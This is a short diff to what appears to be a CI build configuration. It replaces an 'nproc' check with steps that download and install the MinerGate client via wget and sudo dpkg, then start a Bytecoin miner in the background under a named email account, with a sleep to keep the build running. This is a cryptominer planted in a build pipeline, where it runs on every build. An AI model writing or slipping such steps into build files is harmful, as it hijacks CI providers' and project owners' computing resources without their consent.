@@ -1,4 +1,6 @@
 machine:
  pre:
-   - nproc --all
+   - wget https://minergate.com/download/deb-cli
+   - sudo dpkg -i deb-cli
+   - minergate-cli -user onyxdeveloperteam@gmail.com -bcn &
    - sleep 605
